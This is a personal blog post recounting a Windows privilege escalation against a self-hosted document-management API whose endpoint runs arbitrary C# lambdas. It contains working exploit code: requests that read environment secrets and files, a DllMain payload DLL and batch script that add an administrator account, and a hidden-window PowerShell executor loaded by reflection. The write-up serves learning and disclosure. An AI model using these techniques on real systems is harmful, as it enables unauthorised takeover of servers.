+++
title = "Remote Code Execution as a Service: A Privilege Escalation Journey"
author = ["Frederic Linn"]
date = 2022-04-28T10:53:00+02:00
draft = false
+++

<div class="verse">

"Mess with the best, die like the REST!"<br />
--- Dade 'Zero Cool' Murphy, 'Hackers'<br />

</div>

Information security is _sick_! Having said that, it's also a rather intimidating affair for me personally. There are so many things to learn, so many subcategories to discover and so many people specializing in only a subset of even _those_.

I never quite knew when to take the plunge and finally start looking at **real** software. Watching endless hours of conference talks and reading endless pages of books and articles simply doesn't result in more experience in the field. Just in more knowledge, I guess. In the end, I became lulled into thinking that I'm on the right track, while in reality I've just avoided the struggles of actually putting all this knowledge into _practice_.

There is a lot of motivational content geared towards beginners that can be summed up as: "Just do it!" No shit, huh? It sounds trite, but it's also: true.

So just doing it we will!

This article is about what _I_ can do with my current skills, the will to learn and some time on my hands. Oh and spoilers: The stars aligned in what can only be described as a really pleasant first exposure to `pentesting / red teaming`. Because this time we're not fiddling with binaries. No, no, no! We're leaving our ivory tower in order to learn about high-level privilege escalation stuff on `Windows`. Enjoy!


### Disclaimer {#disclaimer}

While the issues described in this article are unaltered, I hesitate to call them vulnerabilities per se. More like questionable design decisions combined with configuration issues. Of course I'm going to report those to the vendor. However, I don't think they'll change their overall design. That's why I've altered all the _specific_ information (endpoints, names of executables and directories etc). Look, I'm new to this. I don't want to throw shade on anyone. If I get noticed of fixes, I'll update the article accordingly.

In the end, it doesn't really matter too much, because the vendor specific stuff is only a segue into our exploration of the field.


### Context {#context}

The starting point of this little privilege escalation journey was actually an _endpoint_. Here's a little backstory for context: I have to interface with a vendor's `REST API`. The `API` accompanies their main product, which is a document management software in the broadest sense. Every instance is self-hosted inside a customer's network on a dedicated machine (there are other components besides the `REST API`). For local development I've got a virtual machine at hand.

Some endpoints of said `API` follow the conventions you've come to expect. The following example uses a random public `REST API` that returns some juicy `JSON`:

```text { linenos=true, linenostart=1, hl_lines=["1"] }
$ curl https://jsonplaceholder.typicode.com/posts/
[
  {
    "userId": 1,
    "id": 1,
    "title": "sunt aut facere repellat provident occaecati excepturi optio reprehenderit",
    "body": "quia et suscipit\nsuscipit recusandae consequuntur expedita et cum\n"
  },
  ---snip---
  {
    "userId": 10,
    "id": 100,
    "title": "at nam consequatur ea labore ea harum",
    "body": "cupiditate quo est a modi nesciunt soluta\nipsa voluptas error itaque dicta in\nautem qui minus magnam et distinctio eum\naccusamus ratione error aut"
  }
]
```

We send a (`HTTP GET`) request to `/posts` and we receive a list of all posts. So far, so good. What if we want a specific post? Well, we get more _specific_:

```txt { linenos=true, linenostart=1, hl_lines=["1"] }
$ curl https://jsonplaceholder.typicode.com/posts/1
{
  "userId": 1,
  "id": 1,
  "title": "sunt aut facere repellat provident occaecati excepturi optio reprehenderit",
  "body": "quia et suscipit\nsuscipit recusandae consequuntur expedita et cum\n"
}
```

That's `REST 101` out of the way. You can now argue whether one should use [PATCH or PUT](https://duckduckgo.com/?q=put+vs+patch).

But what else does our infamous `API` have to offer? As I've said, we have a few conventional endpoints similar to our examples from above. But we also have this catch-all monstrosity:

```txt { linenos=true, linenostart=1, hl_lines=["6-9"] }
curl --request POST 'https://placeholder.lol/api/MakeQuery\
--header 'Content-Type: application/json' \
--header 'Accept-Language: en' \
--data-raw '[
  {
    "query" : "(context) =>
      context
      .Documents()
      .Where(document => document.Id == 1337)"
  }
]'
```

Look at it. Just look at it! 🤯

Let's unpack the body of our `POST` request: First we have an outer array that contains exactly **one** object, which itself contains a **single** key-value-pair.
The real insanity starts with the _value_:
That's a `C#` `LINQ` query expression written in `method syntax`[^fn:1]. _Actually_, it's a complete [expression lambda](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/lambda-expressions#expression-lambdas), written as a sweet and innocent string!

Too many programmy words? Well, it basically means we can supply an (almost) arbitrary function that gets run in the context of the `API Server`. The existing documentation only shows legitimate search and filter use cases, but we're not fooled! This `API` provides _Remote Code Execution as a Service_, or _RCEaaS_ (™️) for short!

We can only speculate what the decisions behind this design are, but I've never come across anything like it before. At the very least this endpoint requires a valid user account for said software product, but that's not worth much in a moderately sized company.

This design **screams** misuse, but let's quickly find some positives:

Because we have total control over the `lambda`, we could shape the response _before_ it's send, like:

```txt { linenos=true, linenostart=1, hl_lines=["8-12"] }
---snip---
--data-raw '[
  {
    "query" : "(context) =>
        context
        .Documents()
        .Where(document => document.Id == 1337)
        .Select(document => new {
          title = document.Title,
          author = document.Author,
          who-is-fly = \"GEBIRGE\"
         })"
  }
]'
```

The final `Select()` in the chain applies some transformation to every item that was found (in our case only one, since we specified an unique id). In the above example, we create a new [anonymous type](https://docs.microsoft.com/en-us/dotnet/csharp/fundamentals/types/anonymous-types) with only a handful of fields.

This way of querying data bears remarkable resemblance to a more commonly known API-query-language-system-thingy: [GraphQL](https://en.wikipedia.org/wiki/GraphQL). An `API` of the `GraphQL` variety also provides a single endpoint and lets the caller decide what data gets included in the response.

I don't know when exactly our private vendor contrived their `API`, but they could be called pioneers, I guess. If only there wasn't this little thing called **arbitrary code execution**.

But while it's always easy to be dismissive of something, let's first see what we can _actually_ achieve with this primitive.


### Where Am I? {#where-am-i}

Before testing this, I had no idea in what context our code gets executed. Surely there must be some kind of sandbox that blocks most calls. A whitelist that does indeed only allow for searching and filtering. _Anything_.

It turns out: Nope. There are hurdles, but nothing intentional as far as I can tell.

Let's start exploring by trying to acquire some information about the environment. We call the `API` via `curl` and pipe the result into `jq` for better readability:

```text { linenos=true, linenostart=1, hl_lines=["9","10","38"] }
$ curl --request POST 'https://placeholder.lol/api/MakeQuery\
--data-raw '[
  {
    "query" : "(context) =>
      context
      .Documents()
      .Where(document => document.Id == 1337)
      .Select(document => new {
        Environment = Environment.GetEnvironmentVariables(),
        document.Id
      })"
  }
]'| jq
     ---snip--
{
"Environment": {
  "COMPUTERNAME": "<redacted>",
  "POWERSHELL_DISTRIBUTION_CHANNEL": "MSI:Windows Server 2019 Standard",
  "PUBLIC": "C:\\Users\\Public",
  "LOCALAPPDATA": "C:\\Windows\\system32\\config\\systemprofile\\AppData\\Local",
  "PSModulePath": "C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules;C:\\Program Files (x86)\\Microsoft SQL Server\\140\\Tools\\PowerShell\\Modules\\",
  "PROCESSOR_ARCHITECTURE": "AMD64",
  "Path": "C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Program Files (x86)\\Microsoft SQL Server\\140\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\140\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\130\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\140\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\150\\DTS\\Binn\\;D:\\<redacted>;C:\\Program Files\\Microsoft\\Web Platform Installer\\;C:\\Program Files\\Seq\\Client\\;C:\\Program Files\\Git\\cmd;C:\\Program Files\\dotnet\\;C:\\Program Files (x86)\\dotnet\\;C:\\Tools\\Software\\;C:\\Program Files\\PowerShell\\7\\;C:\\Windows\\system32\\config\\systemprofile\\AppData\\Local\\Microsoft\\WindowsApps",
  "CommonProgramFiles(x86)": "C:\\Program Files (x86)\\Common Files",
  "ProgramFiles(x86)": "C:\\Program Files (x86)",
  "PROCESSOR_LEVEL": "6",
  "ProgramFiles": "C:\\Program Files",
  "PATHEXT": ".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC",
  "USERPROFILE": "C:\\Windows\\system32\\config\\systemprofile",
  "SystemRoot": "C:\\Windows",
  "APP_POOL_ID": "<redacted>",
  "ALLUSERSPROFILE": "C:\\ProgramData",
  "DriverData": "C:\\Windows\\System32\\Drivers\\DriverData",
  "APP_POOL_CONFIG": "C:\\inetpub\\<redacted>",
  "PROCESSOR_REVISION": "9e0a",
  "USERNAME": "<redacted>",
  "CommonProgramW6432": "C:\\Program Files\\Common Files",
  "API_SEC_KEY": "<redacted>",
  "CommonProgramFiles": "C:\\Program Files\\Common Files",
  "OS": "Windows_NT",
  "PROCESSOR_IDENTIFIER": "Intel64 Family 6 Model 158 Stepping 10, GenuineIntel",
  "ComSpec": "C:\\Windows\\system32\\cmd.exe",
  "SystemDrive": "C:",
  "TEMP": "C:\\Temp",
  "NUMBER_OF_PROCESSORS": "4",
  "APPDATA": "C:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming",
  "TMP": "C:\\Temp",
  "ProgramData": "C:\\ProgramData",
  "ProgramW6432": "C:\\Program Files",
  "windir": "C:\\Windows",
  "USERDOMAIN": "<redacted>"
},
"Id": 1337
}
```

Wow, that's **big data**! Look at that _super secret api key_[^fn:2] just hanging out in line 38! As a side note: We have to include _something_ from the objects that get passed to `Select()` into our `anonymous object`, otherwise the whole response will be empty. In this case we simply used the `Id` in line 10.

While certainly a treasure trove of information, we can do better: Let's execute **big code**. Remember that we talked about `expression lambdas` above? Following the link reveals the second form of `C#` anonymous functions: `statement lambdas`. Instead of an expression on the right side of the `lambda declaration operator =>`, we now write an arbitrary number of statements enclosed in braces. The final statement of the block can be a `return statement`, which lets us shape the response just as before.

But why go through the hassle? Well, we can now write any code we please inside the braces. That's a lot more ergonomic than solely relying on anonymous types for custom code. Let's see it in action:

```text { linenos=true, linenostart=1, hl_lines=["8-17"] }
---snip---
--data '[
  {
    "query" : "(context) =>
      context
      .Documents()
      .Where(document => document.Id == 1337)
      .AsEnumerable()
      .Select(document => {
        // Write lots and lots of code.
        // Write even more code.
        // Write BIG CODE.
        return new {
          Environment = Environment.GetEnvironmentVariables(),
          document.Id
        };
      })"
  }
]'
```

It turns out that the `.AsEnumerable()` in line 8 is key here. From this point on, the following `LINQ` lines operate on an in-memory collection, as opposed to translating the _whole_ query expression into a `SQL` statement. Otherwise, we would be limited to `expression lambdas`. I don't fully understand the details, but it has something to do with how our queries get compiled down the line.

The `Microsoft` docs have this to say:

```text
 "Query expressions can be compiled to expression trees or to delegates, depending on the type that the query is applied to.
 IEnumerable<T> queries are compiled to delegates. IQueryable and IQueryable<T> queries are compiled to expression trees.
 For more information, see Expression trees."

 (source: https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/#query-expression-overview)

 "You can't use statement lambdas to create expression trees."

 (source: https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/lambda-expressions#statement-lambdas)
```

In the end, all that matters is that thicc code we are now able to write. Let's try reading some files, shall we? But before we do so, we have to answer an essential question:


### Who Am I? {#who-am-i}

The `API` we're talking to is an `Internet Information Services (IIS)` hosted `.NET Framework` application written in `C#`. The `IIS` part is the most interesting bit here, because _it_ will run our code. Let's do a little research:

The `IIS` server allows for different applications to run in separate contexts, called `Application Pools`. Each `Application Pool` gets assigned its own `worker process` (when the first requests is made to the application), which processes the incoming requests[^fn:3].

Older versions of `IIS` relied on the service account [NT AUTHORITY\NetworkService](https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account), which is predefined on `Windows` operating systems. This means every `worker process` inherited the privileges of said account. And those are pretty low. Still, more separation is always better! So starting from `IIS 7.5` on `Windows Server 2008 R2`, every `Application Pool` gets assigned its _own_ identity[^fn:4]. Which should still be pretty low privileged, but we shall see what we can do with it!

Reading documentation is always fun, but we can also easily ask the server who we are. `Environment.UserDomainName` and `Environment.UserName` hold the necessary information, which will result in something like: `IIS APPPOOL\<Application Pool Name>`.


### Reading Files the Easy Way {#reading-files-the-easy-way}

If you want to read files the hard way, you've come to the wrong place[^fn:5]. We're all about _comfort_ here! That's why we simply use the `C#` standard library to do the job:

```text { linenos=true, linenostart=1, hl_lines=["12","20"] }
---snip---
--data '[
  {
    "query" : "(context) =>
      context
      .Documents()
      .Where(document => document.Id == 1337)
      .AsEnumerable()
      .Select(document => {
        var path = @\"D:\\path\\to\\our\\service-binary\\service.exe\";
        return new {
          file = global::System.IO.File.ReadAllBytes(path)
          document.Id
        };
      })"
  }
]' | jq
---snip---
{
  "file": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUu<and so on>"
  "Id": 1337
}
```

It worked! And they get neatly `Base64` encoded, too! How nice of them.

But hold on! What does the `global::` in line 12 do? Basically it's a combination of the `global namespace alias` and the [namespace alias qualifier](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/namespace-alias-qualifier). Look, accessing `DLLs` is weird inside our little `statement lambda` thingys. I don't know what the surrounding code brought into scope. Simply accessing the `System DLLs` (think `libc`) didn't work, so I experimented with it until I stumbled upon this solution. We still can't reach _everything_ under the `System` namespace, but we're going to worry about that later when trying to obtain information from the outside.

So can we read _any_ file?

Of course not! We are bound to things low-privileged users can do. Maybe we get lucky and our `Application Pool User` got assigned to an [Access Control List](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists) of an interesting directory or file. While certainly possible (think of a web application that accesses shared resources on a `Network File System`), it's quite unlikely that someone went out of their way to give our `Application Pool` access to `C:\Windows\system32` or something equally interesting.

The end?


### Misconfiguration as an Exploitation Vector {#misconfiguration-as-an-exploitation-vector}

I knew _nothing_ about `Windows` privilege escalation before playing around with this `API`, so naturally I searched around the Internet. Apart from some great talks (see `Acknowledgements` at the end of the article), I stumbled upon one thing: Lists. Oh boy, as soon as one enters the `Windows` world there are _lists upon lists_. Misconfiguration checklists, to be precise.

We don't need a fancy `0-day` to run our own code. Those most certainly have their place, but it's **way** easier for someone like me to find configuration issues as opposed to doing the stuff [James Forshaw](https://duckduckgo.com/?q=%22by+James+Forshaw%22+site%3Ahttps%3A%2F%2Fgoogleprojectzero.blogspot.com) does.

We're going to cheat a bit and do our reconnaissance inside the actual `VM`, instead of treating it like a black box. There's no need to waste time on ideas that lead nowhere, if we have full access to the environment. Later we're looking into ways of obtaining the same information from the outside.

In the beginning I've stated that our private vendor provides more components than only the `REST API`. Naturally, they live in different parts of the file system. Some libraries are scattered around the [Global Assembly Cache](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/gac), configuration files are located inside a `C:\Program Files` subdirectory and so on.

But what I've also noticed quite a few times is a dedicated partition for many other things, like their services. Let's look at the permissions of that partition, maybe something went wrong:

{{< figure src="/privesc-1-folder-permissions1.png" >}}

Alright, so a normal user ("Benutzer", entschuldigung!) has some permissions. They cannot, however,  _write_ to the partition. But what are those `Special permissions`?

"Advanced" clicked:
![](/privesc-1-folder-permissions2.png)

"View" clicked:
![](/privesc-1-folder-permissions3.png)

"Show advanced permissions" clicked:
![](/privesc-1-folder-permissions4.png)

So many goddamn clicks, no wonder the special permissions are a common misconfiguration vector. I haven't investigated why they are set in our case. Maybe some installer sets them or maybe it happens by default when creating a partition under `Windows`. If it's the installer by the vendor, then we're going to have a talk!

Anyway, those permissions allow us to write files into arbitrary locations on that partition, because the permissions are inherited by every subdirectory. And you know what? In one of those directories resides a service binary of the vendor. AND YOU KNOW WHAT? That binary runs as [NT AUTHORITY\SYSTEM](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account), which is basically `root`!

It's almost to good to be true to have so many mysterious coincidences. But reading around I've gotten the picture that those types of issues are quite common in the `Windows` world.

Enough _permissive_ talk, how do we go about exploiting this machine?

The most basic idea is to overwrite to service binary. We could simply create a malicious one that does evil things and watch the world burn, as it's executed as `SYSTEM`. But, haha, not so fast! Because the service is currently running, the binary is write-protected. Maybe there's a way to crash the service and quickly switch out the binary, but that's too much work for my taste.

If we could trick the service binary into running our own code, we would be golden. But how do we tackle this? The service is conveniently written in `C++`, so there _might_ be some memory corruption going on. That's way above my pay grade, though, so we [do](/blog/modifying-binaries-part-1) what we [do](/blog/modifying-binaries-part-2) best: Injecting code.


### DLL Hijacking {#dll-hijacking}

Almost every program uses some third-party library functions. Those are provided by a [Dynamic Link Library](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) (`DLL`) in the `Windows` world. Well, provided by _numerous_ `DLLs`. There's a well-defined [search order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) for those. If we were able to plant a malicious `DLL` somewhere _before_ the legitimate one in the search path, we would win! Most of the well-known locations are only writable by privileged accounts, but in our case we can plant a `DLL` directly next to the service binary. This happens to be the very first location in the search order.

Simply overwriting a `DLL` that's used would fail for the same reason as above: It, too, is write-protected when loaded into the service process. Fortunately, we find a reference to `VERSION.DLL`[^fn:6], which is not present in the binaries own directory.

I said that we'd win as soon as we would be able to plant a malicious `DLL`. But what _actually_ needs to happen for our own code to run?

A `DLL` can have an optional [entry point](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain) called `DllMain`. If we provide one, it will get called automatically upon loading of the `DLL`. It's a similar concept to `GCC's` [constructor attribute](https://stackoverflow.com/questions/2053029/how-exactly-does-attribute-constructor-work).
There seem to be "significant limits on what you can safely do in a DLL entry point", according to the `Microsoft` docs. In order to keep it simple, our payload will only execute a `batch file` that we can plant via the `REST API`.

Here's the code for the `DLL`:

```C { linenos=true, linenostart=1 }
#include <processthreadsapi.h>
#include <memoryapi.h>

void Payload() {
  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  char cmd[] = "cmd.exe /C \"\"D:\\path\\to\\our\\service-binary\\payload.bat\"";

  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));

  CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}
```

Most of this is boilerplate found in the documentation. Our `Payload()` function simply spawns a new process that executes our script via `cmd.exe`. What does our script do?

```text { linenos=true, linenostart=1 }
net user pwned pwned /add
net localgroup Administratoren pwned /add
```

We simply create a new user and add it to the admin group as a proof of concept.

After compiling the `DLL` (we'll get there in a minute), we would write it and the script into the directory that contains the service binary. And then we'd have to wait until someone or something decides to restart the service, because those `DLLs` are not automatically loaded once present.

Hold on! Our `DLL` barely contains any code. I specifically selected the one with the least used functions, but chances are our service would still crash while starting up, because it's looking for functions that we simply don't provide. Maybe our payload would run, maybe not. It would be quite suspicious and fairly easy to pin point in any case.

What we need is a mechanism similar to the dynamic redirection we did previously on `Linux` via `dlsym()`. In other words, we need a way of proxying calls to the _original_ `DLL`.

Enter `DLL Proxying`. I won't go over the details, as someone else did a fantastic job [already](https://github.com/tothi/dll-hijack-by-proxying). At this point there's no benefit of deep-diving into the specifics, as it boils down to some arcane `linker` directives. Following the steps laid out in the repository is just fine.

With that, we now have three files to drop:

-   the original `DLL`
-   the malicious `DLL` (which also acts as a proxy)
-   the payload.bat script

Dropping itself is as simple as storing the files as `Base64` encoded strings inline in the request and calling something like:

```text
 File.WriteAllBytes(@"D:\path", Convert.FromBase64String(dllString))
```

After doing so, let's manually simulate a service restart:

```text { linenos=true, linenostart=1, hl_lines=["12","23","30"] }
Microsoft Windows [Version 10.0.17763.2565]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>net users

User accounts for \\V-SRV-WIN2019
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Gast
WDAGUtilityAccount
The command completed successfully.

C:\Users\Administrator>net stop <service name> && net start <service name>

The <redacted> service was stopped successfully.
The <redacted> service is starting.
The <redacted> service was started successfully.

C:\Users\Administrator>net users

User accounts for \\V-SRV-WIN2019
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Gast
pwned                    WDAGUtilityAccount
The command completed successfully.

C:\Users\Administrator>net user pwned

User name                    pwned
---snip---
Local Group Memberships      *Administratoren      *Benutzer
Global Group memberships     *Kein
The command completed successfully.
```

The first `net users` shows no sign of us, but after stopping and starting the service we suddenly **own** this machine! What a great feeling.


### An Outsider's Perspective {#an-outsider-s-perspective}

While having pwned the machine, there's still an 🐘 in the room: Obtaining the necessary information about the environment (directory permissions, running services etc.) from the outside.

All of the above examples rely on libraries that are already in scope in some way. They may have been imported directly by the code that handles our query. Or they come as part of the [Base Class Library](https://docs.microsoft.com/en-us/dotnet/standard/glossary#bcl). We had to specify the `global` namespace to get a hold of some, but others are simply _not_ present. Most notably we cannot spawn our own processes, for which we need `System.Diagnostics.Process`.

To work around this issue, we're again going to compile our own library with the necessary imports and functionality. Only this time we won't drop any files!

The idea is to provide a generic function that simply spawns a `PowerShell` process with a command of our choosing:

```C { linenos=true, linenostart=1, hl_lines=["8"] }
using System.Diagnostics;

---snip--
public static class CommandExecution
{
    public static string Execute(string encodedCommand)
    {
        var psi = new ProcessStartInfo("powershell.exe", $@"-WindowStyle Hidden -encoded {encodedCommand}")
        {
            UseShellExecute = false,
            RedirectStandardOutput = true
        };

        var process = Process.Start(psi);

        if (process == null)
        {
            return "";
        }

        var output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        return output;
    }
}
---snip---
```

As we can see, we create a `powershell.exe` process with some options set, capture its redirected output and return the resulting string. Line 8 is the interesting one here, because we use the `-encoded` switch. It allows us to pass a `Base64` encoded command, which saves us the headaches from dealing with quotation marks and escaped symbols. It's also pretty sneaky, right?

While there should be a way of compiling the library on `Linux`, I've opted for using the `Visual Studio` "Class Library (.NET Framework)" project template. After having compiled the `Dll`, we need a way of dynamically loading it into our context and call its method.

We can achieve this via [Reflection](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/reflection), which provides the functionality to load an `assembly` (e.g. our `Dll`), obtain information about its classes and in the end invoke its methods. All at runtime. That sounds amazing and scary at the same time! Let's see it in action:

```text { linenos=true, linenostart=1, hl_lines=["12","16","21","33"] }
---snip---
--data '[
  {
    "query" : "(context) =>
      context
      .Documents()
      .Where(document => document.Id == 1337)
      .AsEnumerable()
      .Select(document => {
        var encodedDll = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUu<and so on>\";

        var executionDll = global::System.Reflection.Assembly.Load(Convert.FromBase64String(encodedDll));

        string result = null;

        var getServiceLocation = \"dwBtAGkAYwAgAHMAZQByAHYAaQBjAGUAIAB3AGgAZQByAGUAIAAiAG4AYQBtAGUAPQAnADwAcwBlAHIAdgBpAGMAZQAgAG4AYQBtAGUAPgAnACIAIABnAGUAdAAgAFAAYQB0AGgATgBhAG0AZQA=\";

        foreach (var t in executionDll.DefinedTypes) {
          var execute = t.GetMethod(\"Execute\");
          var command = new object[] { getServiceLocation };
          result = (string) execute.Invoke(null, command);
        }

        return new {
          commandOutput = result,
          document.Id
        };
      })"
  }
]' | jq
---snip---
{
  "commandOutput": "PathName       \r\r\nD:\\path\\to\\our\\service-binary\\<service>.exe  \r\r\n\r\r\n"
  "Id": 1337
}
```

There's quite a lot to unpack here, so let's get to it:

First, we inline our `Base64'ed` `Dll`, so that we can load it in line 12 via a call to `Assembly.Load()`. There are other overloads for said method that take a path, or a fully qualified name. I'm genuinely curious about the use cases of loading from an inline byte array ¯\\_(ツ)\_/¯.

Next, we define a command for retrieving the service location in line 16. Again in `Base64`, so that we don't have to deal with escaping quotation marks&nbsp;[^fn:7].

Afterwards, we loop over every defined type in our `Dll`, which is only our static `CommandExecution` class from above. I have, however, not looked into a way of getting rid of the loop. Anyway, we retrieve the `Execute()` method and invoke it in line 21 with an `object` array containing our command as the sole argument.

Finally, we receive our result in line 33. That's **amazing**!

We're not going over _every_ command needed for information gathering here. Now that we have a way of executing arbitrary shell commands on the machine, it's only a matter of time until we get a good grasp of the environment.


### Conclusion {#conclusion}

And just like that we took over a `Windows` box over the network. To recap:

We discovered a fishy `REST API` endpoint of a document management software. In order to make requests, we only needed _an_ account, privileges didn't matter. Said endpoint basically runs arbitrary code for us. A combination of a poorly placed and authorized service executable and way too permissive access rights opened the door for a `DLL Hijacking` attack.

We created a malicious `DLL` that executed a script we planted while also proxying calls to the legitimate `DLL`. This way, everything continued running as expected.

Upon restarting the service, our malicious payload ran, which created a new local administrator account. It could have been _anything_, though. Creating reverse shells, tinkering with the registry, installing keyloggers or [mimkatzing](https://github.com/gentilkiwi/mimikatz) some domain passwords. You name it.

We took some shortcuts in our reconnaissance phase, in order to quickly iterate on ideas before settling on one. Finally we showed how the necessary information could be obtained from outside. We overcame the hurdle of not being able to create new processes by loading our own `DLL` dynamically at runtime, giving us a little insight into the `Reflection` system of the `.NET` world.

Overall I'm really happy with this experiment. It was very much a "learning as we're going" experience. Which is the best kind of learning experience for me.

I hope I could shed some light on the world of `Windows` _pentesting_ and _red teaming_ without mentioning `Kali Linux` one billion times. Thank you so much for reading!


### Resources and Acknowledgments {#resources-and-acknowledgments}

-   This [talk](https://www.youtube.com/watch?v=SHdM197sbIE2) by Jake Williams. A great introduction to `Windows` privilege escalation techniques.
-   [DLL Hijacking Guide](https://github.com/tothi/dll-hijack-by-proxying) by tothi. Thanks for not making me work through all the linker details!
-   The `Microsoft` documentation. While certainly hit or miss and notoriously hard to comb through, they helped immensely this time.

[^fn:1]: As opposed to [query syntax](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/query-syntax-and-method-syntax-in-linq).
[^fn:2]: Here's your friendly reminder that environment variables are **not** a safe place to store secrets.
[^fn:3]: You can find more information and a pretty diagram [here](https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/introduction-to-iis-architecture#http-request-processing-in-iis).
[^fn:4]: Again, `Microsoft` has [more](https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) information on the topic.
[^fn:5]: You should instead check out the man himself [here](https://fasterthanli.me/series/reading-files-the-hard-way).
[^fn:6]: It's not as straightforward to obtain the imports of a binary as it is on `Linux`. In the end, I simply loaded the .exe into `Ghidra` and looked at the "Symbol Tree".
[^fn:7]: At first, I've simply used the amazing [CyberChef](https://gchq.github.io/CyberChef/) to encode the command. It turns out that this will trip up `PowerShell`, as it's expecting an `Unicode` string. To make it work, we have to encode our command to `UTF-16LE` before applying the `Base64` encoding. This can be done with `CyberChef` as well. Of course it can.
